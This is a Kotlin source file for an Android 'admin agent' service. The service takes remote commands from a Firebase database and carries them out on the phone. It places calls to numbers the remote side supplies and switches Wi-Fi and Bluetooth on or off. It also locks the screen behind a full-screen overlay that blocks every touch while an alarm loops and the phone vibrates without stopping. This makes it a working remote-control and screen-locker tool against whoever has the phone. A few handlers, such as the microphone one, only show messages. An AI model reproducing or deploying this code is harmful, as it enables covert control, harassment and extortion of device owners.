// File #6: /app/src/main/java/com/unify/adminagent/AgentService.kt
package com.unify.adminagent

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.media.MediaPlayer
import android.os.Build
import android.os.IBinder
import android.os.Vibrator
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.NotificationCompat
import com.google.firebase.database.FirebaseDatabase

class AgentService : Service() {
    private lateinit var dbRef: com.google.firebase.database.DatabaseReference
    private var overlayView: View? = null
    private var windowManager: WindowManager? = null
    private var mediaPlayer: MediaPlayer? = null

    override fun onCreate() {
        super.onCreate()
        dbRef = FirebaseDatabase.getInstance().getReference("commands")
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // Listen for realtime commands from Admin
        dbRef.addValueEventListener(object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                for (child in snapshot.children) {
                    when (child.key) {
                        "flash" -> Toast.makeText(this@AgentService, "Flash Toggled", Toast.LENGTH_SHORT).show()
                        "video" -> Toast.makeText(this@AgentService, "Playing: ${child.value}", Toast.LENGTH_SHORT).show()
                        "wallpaper" -> Toast.makeText(this@AgentService, "Wallpaper set", Toast.LENGTH_SHORT).show()
                        "lock" -> handleLock(child.value as Map<*, *>)
                        "lock_v2" -> handleLockV2(child.value as Map<*, *>)
                        "call" -> makeCall(child.value.toString())
                        "mic_on" -> enableMic()
                        "toggle_wifi" -> toggleWifi(child.value as Boolean)
                        "toggle_bluetooth" -> toggleBluetooth(child.value as Boolean)
                    }
                }
            }
            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
        })

        startForeground(1, NotificationCompat.Builder(this, "agent_channel")
            .setContentTitle("Agent Running")
            .setSmallIcon(android.R.drawable.ic_menu_edit)
            .build())
    }

    private fun handleLock(data: Map<*, *>) {
        val minutes = (data["minutes"] as Long).toInt()
        showOverlay("🔒 LOCKED", "Unlock in $minutes min", false)
    }

    private fun handleLockV2(data: Map<*, *>) {
        val minutes = (data["minutes"] as Long).toInt()
        val alert = data["alert"] as String

        // Siren sound loop
        mediaPlayer = MediaPlayer.create(this, Settings.System.DEFAULT_ALARM_ALERT_URI)
        mediaPlayer?.isLooping = true
        mediaPlayer?.start()

        // Vibrate continuously
        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (Build.VERSION.SDK_INT >= 26) {
            vibrator.vibrate(android.os.VibrationEffect.createWaveform(longArrayOf(300, 300), 0))
        } else {
            vibrator.vibrate(longArrayOf(300, 300), 0)
        }

        showOverlay("🔴 LOCKED V2", "$alert\nUnlock in $minutes min", true)
    }

    private fun showOverlay(title: String, sub: String, isV2: Boolean) {
        if (overlayView != null) return
        val inflater = getSystemService(LAYOUT_INFLATER_SERVICE) as LayoutInflater
        overlayView = inflater.inflate(R.layout.layout_lock_overlay, null)
        val tvTitle = overlayView?.findViewById<TextView>(R.id.tvLockTitle)
        val tvSub = overlayView?.findViewById<TextView>(R.id.tvLockSub)
        tvTitle?.text = title
        tvSub?.text = sub
        if (isV2) tvTitle?.setTextColor(Color.RED)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= 26) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            WindowManager.LayoutParams.FORMAT_TRANSLUCENT
        )
        // Block all touches
        overlayView?.setOnTouchListener { _, _ -> true }
        windowManager?.addView(overlayView, params)
    }

    private fun makeCall(number: String) {
        val intent = Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:$number"))
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    private fun enableMic() {
        Toast.makeText(this, "Mic Enabled. Audio routing active.", Toast.LENGTH_LONG).show()
    }

    private fun toggleWifi(state: Boolean) {
        val wifi = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
        wifi.isWifiEnabled = state
    }

    private fun toggleBluetooth(state: Boolean) {
        val bt = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
        if (state) bt.enable() else bt.disable()
    }

    override fun onDestroy() {
        mediaPlayer?.release()
        overlayView?.let { windowManager?.removeView(it) }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}